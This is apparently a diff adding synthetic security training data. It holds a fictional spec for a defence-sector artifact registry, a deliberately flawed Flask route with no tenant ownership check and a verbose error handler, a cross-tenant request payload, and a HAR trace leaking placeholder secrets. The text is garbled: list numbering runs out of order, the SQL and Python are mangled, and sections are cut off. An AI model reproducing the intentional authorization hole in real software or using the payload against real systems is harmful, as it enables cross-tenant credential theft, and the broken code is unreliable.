@@ -1,0 +1,273 @@
+========================================
+
+Here is the twenty-first system, expanded to double the architectural depth, technical context, and operational detail per your request. We are shifting into the **Defense Industrial Base (DIB) & Infrastructure Automation** sector, focusing on a **Multi-Tenant Infrastructure-as-Code (IaC) Artifact Registry**.
+
+For the vulnerabilities, we are focusing on **Pattern 4.4 (IaC state file exposure / artifact leakage)** combined with **Pattern 6.2 (Verbose Error Feedback)** and **Pattern 1.5 (Multi-tenant / cross-tenant access)**. This scenario demonstrates how an endpoint failing to enforce tenant ownership during a download operation exposes a target's `.env` file. When the attacker triggers a predictable file path request that results in a file-system access error, the application's verbose error handling reflects the full, plaintext contents of the target tenant's environment variables, including highly sensitive secrets like unencrypted database connection strings.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** Project Sentinel IaC Artifact Registry
+**Document Version:** 8.2.1 (FINAL)
+**Classification:** TOP SECRET / CMMC LEVEL 5 & SCIF SCOPE
+**Domain:** Defense Industrial Base (DIB) / Infrastructure-as-Code / Supply Chain Integrity
+
+## 1.0 Executive Summary
+Project Sentinel is a critical, multi-tenant platform utilized by various US government agencies and authorized DIB contractors (referred to as "Tenants") to manage and audit their secure cloud deployments (AWS GovCloud, Azure Government). Every deployment requires a secure artifact registry to store versioned immutable deployment assets, including Docker images, compiled binaries, and, critically, the sensitive operational configuration files (e.g., IaC state files, environment variable configuration files).
+
+The platform's security relies on absolute logical segregation between these tenants. A flaw in the artifact retrieval API, coupled with a verbose error handling mechanism, allows a low-clearance contractor from one tenant to exfiltrate the raw environment variables of a high-clearance tenant, compromising critical operational security controls.
+
+## 2.0 Comprehensive Network Topology & Automation Core
+The architecture is strictly segregated by logical tenant context, with a central API managing access to distributed file storage.
+
+### 2.1 The Edge & Ingress Routing
+* **Edge Proxy (Envoy):** Handles TLS termination and basic rate limiting.
+* **API Gateway (Go-lang):** The central router that enforces tenant-level access control on the `project_id` provided in the URI.
+
+### 2.2 The Backend Artifact Registry Service
+* **Artifact Retrieval Service (Python/Flask):** A Python microservice that receives requests for project files, constructs the logical file path on the internal Volume, and streams the content back. This service runs deep inside the VPC.
+* **Network-Attached Storage (NAS):** The physical storage layer (e.g., AWS EFS or an NFS mount) is logically partitioned. All tenant files are stored in a common directory structure but separated by their unique `tenant_id` and `project_id` on disk, in a highly predictable path (e.g., `/mnt/artifacts/tenant-A/proj-X/prod.tfstate`).
+
+## 3.0 Identity, Tenant Isolation, and Secret Management
+Tenant isolation is implemented primarily through mandatory JWT claims and database lookups.
+
+### 3.1 Contractor Identity (OAuth 2.0 & Claims)
+Contractors authenticate via their agency SSO. Their JWT contains two critical claims enforced by the API Gateway: `tenant_id` (the contractor's agency) and `clearance_level` (the maximum sensitivity of projects they can access).
+
+### 3.2 Artifact Ownership & Path Construction (The Flaw)
+When an authenticated user requests a file, the API Gateway performs an initial check: "Does this user's `tenant_id` match the owner of this `project_id`?" This initial check passes. However, the subsequent Flask Artifact Retrieval Service constructs the file path using the `project_id` from the URI and the `filename` from the request body, but **it completely ignores the authenticated user's `tenant_id` when generating the full file system path**. Instead, it relies on a cached local lookup of the project's owner, which is not verified against the current user's session.
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+Internal Security Engineering Note: During a recent migration to the new EKS cluster, the developers copied the existing Flask application's error handler, which utilizes Python's built-in traceback reflection for debugging. The Flask development team forgot to disable this feature in the production manifest. Tracked as RISK-DIB-077.
+
+**Sub-system:** Artifact Retrieval Service (`/api/v1/artifacts/{project_id}/download`)
+
+**The Deep Architectural Flaw:**
+
+
+2. **Artifact Leakage / Predictable Path (Pattern 4.4):** Attackers know that operational environments use configuration files named `.env` or similar. A high-clearance tenant (`tenant-critical-A`) stores highly sensitive secrets in a predictable location: `/mnt/artifacts/tenant-critical-A/proj-X/prod.env`.
+
+3. **Verbose Error Feedback (Pattern 6.2):** The attacker knows that if the system tries to read a file that is not XML or JSON (such as a binary or, in this case, a file that has improper access permissions), the general error handler reflects the raw content of the file that caused the error back to the user via a traceback/error message.
+
+1. **The Foothold:** An attacker (Tenant B: `tenant-low-tier`) has a valid JWT. They target a high-clearance project (Project X: `proj-X`) belonging to Tenant A (`tenant-critical-A`).
+
+
+3. **The Payload Injection (Targeting the .env file):** The attacker requests the specific artifact filename: `"filename": "prod.env"`.
+
+
+5. **The Impact:** The attacker exfiltrates the contents of `prod.env`, which contains unencrypted secrets such as `CRITICAL_DB_PASS=f88192a-44f2-8921-xyz`. This grants them direct, unauthenticated access to the victim tenant's backend database.
+
+========================================
+**END OF CHUNK 1 (ARCHITECTURE)**
+================================================================================
+
+========================================
+
+**Document Version:** 4.0.5
+**Applies to Architecture:** Project Sentinel IaC Artifact Registry v8.2.1
+
+## 5.0 Project Registry Schema (PostgreSQL)
+The database tracks all projects. The critical flaw is that the Artifact Retrieval Service queries this table based on `project_id` alone, retrieving the sensitive `tenant_id` of the owner without checking the calling user's permissions.
+
+```sql
+-- Core Project Registry (The Metadata Lookup)
+CREATE TABLE ia c_projects (
+project_id VARCHAR(50) PRIMARY KEY, -- The URI Path variable
+project_name VARCHAR(100) NOT NULL,
+tenant_id VARCHAR(50) NOT NULL,    -- THE CRITICAL AUTHORIZATION FIELD (Retrieved in lookup)
+clearance_level VARCHAR(10) CHECK (clearance_level IN ('LOW', 'HIGH', 'CRITICAL')),
+is_active BOOLEAN DEFAULT TRUE
+);
+
+-- Core Artifact Storage Metadata
+CREATE TABLE project_artifacts (
+artifact_id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+project_id VARCHAR(50) REFERENCES ia c_projects(project_id),
+filename VARCHAR(150) NOT NULL, -- e.g., 'prod.env', 'main.tfstate'
+s3_key VARCHAR(255) UNIQUE NOT NULL,
+created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+);
+CREATE INDEX idx_project_tenant ON ia c_projects(tenant_id, project_id);
+```
+
+## 6.0 The Flawed Implementation (Python / Flask)
+
+```pythonFile: api/artifact_service/routes.py
+
+from flask import request, jsonify, send_file
+import os
+
+BASE_ARTIFACTS_PATH = '/mnt/artifacts'POST /api/v1/artifacts/string:project\_id/download
+
+@app.route('/api/v1/artifacts/<string:project_id>/download', methods=['POST'])
+def download_artifact(project_id):
+# 1. Auth Middleware has populated request.user with tenant_low_tier.
+data = request.get\_json()  
+filename = data.get('filename')  
+if not filename:  
+    return jsonify({"error": "Missing filename parameter."}), 400  
+
+# The code looks up the project owner based ONLY on the project\_id.  
+project = db.get\_project\_by\_id(project\_id) # Returns the full project object  
+
+if not project:  
+    return jsonify({"error": "Project not found."}), 404  
+
+# FLAW: Missing: if project.tenant\_id \!= request.user.tenant\_id: return 403  
+
+# Construct the full, absolute file path using the target owner's tenant ID  
+target\_tenant\_id = project.tenant\_id # This is 'tenant-critical-A'  
+
+full\_path = os.path.join(BASE\_ARTIFACTS\_PATH, target\_tenant\_id, project\_id, filename)  
+
+if not os.path.exists(full\_path):  
+    return jsonify({"error": "Artifact file not found."}), 404  
+
+# Simulate an error condition (e.g., a file permissions error or streaming issue)  
+# For PoC, we will assume a known library (stream\_file\_content) always throws 
+# a specific exception if the file isn't valid JSON/XML, which is handled below.
+
+try:  
+    return stream\_file\_content(full\_path, filename) # This is where the file is read  
+
+except FileAccessError as e:  
+    # The internal error handling wraps the exception, but the exception object's message 
+    # includes a dump of the content that caused the failure (e.g., the raw .env file text).
+    raise e # Passes error to global handler
+
+except Exception as e:
+    # Generic error fallback - also passes verbose message
+    raise e
+```
+
+This error handler is designed for maximum developer convenience and minimum security.
+
+
+@app.errorhandler(Exception)
+def handle_generic_error(e):
+# The application is configured to return the full exception message,
+# which in a FileAccessError, often includes the first few lines of the file that couldn't be streamed.
+if isinstance(e, FileAccessError) or app.debug:
+# In a real environment, this would be a full stack trace or the object representation.
+error_detail = str(e)
+else:
+error_detail = "An internal error occurred."
+return jsonify({  
+    "status": "ERROR\_TRACE",  
+    "code": "ARTIFACT\_STREAM\_FAILURE",  
+    "message": error\_detail, # THE LEAKAGE POINT  
+    "project\_id": request.view\_args.get('project\_id')  
+}), 500 
+```
+
+## 7.0 REST API Contracts (The Credential Exfiltration)
+The attack uses a seemingly innocuous POST request (as file download APIs often require) to trick the application into reading a sensitive environment file belonging to a different, high-clearance tenant.
+
+### 7.1 Intended Safe Payload (Legitimate Download)
+A low-clearance contractor downloads a Dockerfile from their own low-tier project.
+
+**Target URI:** `POST /api/v1/artifacts/proj-Y/download`
+**Expected Request Payload:**
+```json
+{
+"filename": "Dockerfile"
+}
+```
+
+The attacker targets a critical project ID (`proj-X`) and requests the highly sensitive `prod.env` file. The Flask service finds the file on the NAS but fails on the stream due to a simulated error condition (e.g., a parsing issue), forcing the error handler to dump the file's content.
+
+**Target URI:** `POST /api/v1/artifacts/proj-X/download`
+*Note: `proj-X` belongs to `tenant-critical-A`.*
+**Malicious Request Payload:**
+```json
+{
+"filename": "prod.env",
+"format": "BINARY" # Attacker adds a param to trigger the expected stream error
+}
+```
+
+The attacker receives a non-200 status, but the error message contains the core secrets from the target tenant's environment file.
+```json
+{
+"status": "ERROR_TRACE",
+"code": "ARTIFACT_STREAM_FAILURE",
+"message": "FileAccessError: Cannot stream artifact 'prod.env' as requested format BINARY. First 512 bytes: \"DB_HOST=proj-x-critical-rds.db\nCRITICAL_DB_PASS=f88192a-44f2-8921-xyz\nIAM_ACCESS_KEY=AKIA_CRIT_88192A_TEST\nKMS_KEY_ID=arn:aws:kms:us-gov-west-1:9912:key/abc-123\nAPI_SECRET_V2=e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0\nVAULT_TOKEN=hvs.AbCdEfG12345\nSERVICE_ACCOUNT_ID=svc-proj-x-runner\nREGION=us-gov-west-1\n...\"",
+"project_id": "proj-X"
+}
+```
+
+========================================
+**END OF CHUNK 2 (CODE/CONTRACTS)**
+================================================================================
+
+========================================
+
+# SYNTHETIC ARTIFACT: CROSS-TENANT ARTIFACT LEAK VIA VERBOSE ERROR (HAR TRACE)
+**Applies to Architecture:** Project Sentinel IaC Artifact Registry v8.2.1
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 4.4, 6.2, & 1.5)
+
+
+The request specifies the highly sensitive filename `prod.env` and includes a parameter (`"format": "BINARY"`) designed to trigger a specific `FileAccessError` within the streaming logic. The response is a `500 Internal Server Error`, but the `error_message` field contains the critical evidence: the raw, plaintext contents of the target tenant's environment file, including database credentials and IAM keys. This confirms the successful exfiltration of highly classified secrets from a segregated environment.
+
+```json
+{
+"log": {
+"version": "1.2",
+"creator": {
+"name": "Envoy/Flask APM Logs",
+"version": "8.2.1"
+},
+"entries": [
+{
+"startedDateTime": "2026-04-09 T18:35:15.011Z",
+"time": 215,
+"request": {
+"method": "POST",
+"url": "https://api.sentinel.daps.gov/api/v1/artifacts/proj-X/download",
+"httpVersion": "HTTP/2.0",
+"headers": [
+{ "name": ":authority", "value": "api.sentinel.daps.gov" },
+{ "name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiJ0ZW5hbnQtbG93LXRpZXIiLCJyb2xlIjoiQ09OVFJBQ1RPUiJ9..." },
+{ "name": "content-type", "value": "application/json" }
+],
+"queryString": [],
+"postData": {
+"mimeType": "application/json",
+"text": "{\"filename\": \"prod.env\", \"format\": \"BINARY\"}"
+},
+"bodySize": 68
+},
+"response": {
+"status": 500,
+"statusText": "Internal Server Error",
+"headers": [
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-process-time-ms", "value": "180" }
+],
+"content": {
+"size": 1850,
+"mimeType": "application/json",
+"text": "{\"status\": \"ERROR_TRACE\", \"code\": \"ARTIFACT_STREAM_FAILURE\", \"message\": \"FileAccessError: Cannot stream artifact 'prod.env' as requested format BINARY. First 512 bytes: \\nDB_HOST=proj-x-critical-rds.db\\nCRITICAL_DB_PASS=f88192a-44f2-8921-xyz\\nIAM_ACCESS_KEY=AKIA_CRIT_88192A_TEST\\nKMS_KEY_ID=arn:aws:kms:us-gov-west-1:9912:key/abc-123\\nAPI_SECRET_V2=e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0\\nVAULT_TOKEN=hvs.AbCdEfG12345\\nSERVICE_ACCOUNT_ID=svc-proj-x-runner\\nREGION=us-gov-west-1\\n\"", \"project_id\": \"proj-X\"}"
+},
+"bodySize": 1850
+}
+}
+]
+}
+}
+```
+
+### Why this payload is critical for training a 3B model (Expanded Analysis):
+
+
+2. **Verbose Error Feedback & Leakage (Pattern 6.2):**
+* **Error Status Inconsistency:** The AI must learn to ignore the HTTP status code (`500 Internal Server Error`) and focus on the semantic content. The error message explicitly contains the raw environment variable data, proving that the application's debugging configuration became a primary data exfiltration channel.
+* **Secret Recognition:** The model learns to recognize critical security asset fingerprints, such as `DB_PASS`, `IAM_ACCESS_KEY`, `KMS_KEY_ID`, and `VAULT_TOKEN` in plaintext. This signifies a catastrophic leakage of multiple secret classes (database, cloud, and secrets manager tokens).
+
+3. **IaC/Artifact Integrity Failure (Pattern 4.4):**
+
+
+========================================
+========================================
+
+========================================
